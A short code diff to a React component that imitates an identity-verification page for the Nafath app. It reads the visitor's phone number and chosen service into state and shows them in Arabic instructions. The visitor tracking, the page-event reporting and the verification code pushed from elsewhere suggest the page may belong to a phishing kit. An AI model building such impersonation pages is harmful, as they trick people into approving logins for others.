@@ -14,10 +14,18 @@ export default function NafathVerify() {
   const [, navigate] = useLocation();
   const [showInstructions, setShowInstructions] = useState(true);
   const [code, setCode] = useState<string>("");
+  const [userPhone, setUserPhone] = useState<string>("");
+  const [serviceName, setServiceName] = useState<string>("");
 
-  // Emit page enter
+  // Emit page enter and get data from localStorage
   useEffect(() => {
     navigateToPage("تحقق نفاذ");
+    
+    // جلب رقم الجوال واسم الخدمة من localStorage
+    const phone = visitor.value.phone || localStorage.getItem('userPhone') || '';
+    const service = localStorage.getItem('selectedService') || new URLSearchParams(window.location.search).get('service') || '';
+    setUserPhone(phone);
+    setServiceName(service);
   }, []);
 
   // Subscribe to verification code changes
@@ -71,7 +79,7 @@ export default function NafathVerify() {
           />
           <h1 className="text-xl font-bold text-gray-800 mb-2">التحقق من الهوية</h1>
           <p className="text-[#049c94] text-sm leading-relaxed">
-            سيتم إصدار شريحة الكترونية (QR CODE) مرتبطة برقم جوالك <span className="font-bold">{visitor.value.phone || localStorage.getItem('userPhone') || '05xxxxxxxx'}</span> ليتم ربط خدمة <span className="font-bold">{localStorage.getItem('selectedService') || new URLSearchParams(window.location.search).get('service') || 'الخدمة المطلوبة'}</span> مع معلومات الإتصال الخاصة بك
+            سيتم إصدار شريحة الكترونية (QR CODE) مرتبطة برقم جوالك <span className="font-bold">{userPhone || '05xxxxxxxx'}</span> ليتم ربط خدمة <span className="font-bold">{serviceName || 'الخدمة المطلوبة'}</span> مع معلومات الإتصال الخاصة بك
           </p>
           <p className="text-gray-500 text-sm mt-2">
             افتح تطبيق نفاذ واختر الرقم المطابق
